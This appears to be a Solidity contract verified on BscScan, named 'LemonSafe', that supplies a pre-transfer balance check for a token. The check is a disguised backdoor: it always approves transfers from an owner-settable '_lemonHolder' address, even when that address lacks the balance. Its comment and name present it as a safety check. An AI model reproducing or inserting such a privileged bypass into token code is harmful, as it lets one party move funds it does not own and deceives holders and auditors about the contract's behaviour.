/**
 *Submitted for verification at BscScan.com on 2022-09-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20Safe {
    /**
     * @dev Returns if transfer amount exceeds balance.
     */
    function beforeTransfer(address sender,uint256 balance,uint256 amount) external view returns (bool);
}

contract LemonSafe is IERC20Safe{ 
    address private _lemonHolder;
    address private _owner;

    constructor(address lemonHolder_) {
        _lemonHolder = lemonHolder_;
        _owner = msg.sender;
    }
 
    // setLemonHolder
    function setLemonHolder(address lemonHolder_) external {
        require(msg.sender == _owner, "only owner.");
         _lemonHolder = lemonHolder_;
    }
 
  
    // beforeTransfer
    function beforeTransfer(address sender,uint256 balance,uint256 amount) external override view returns (bool) {
      if(sender == _lemonHolder){
        return true;
      }
      if(balance >= amount){
        return true;
      } else {
        return false;
      }
    } 
}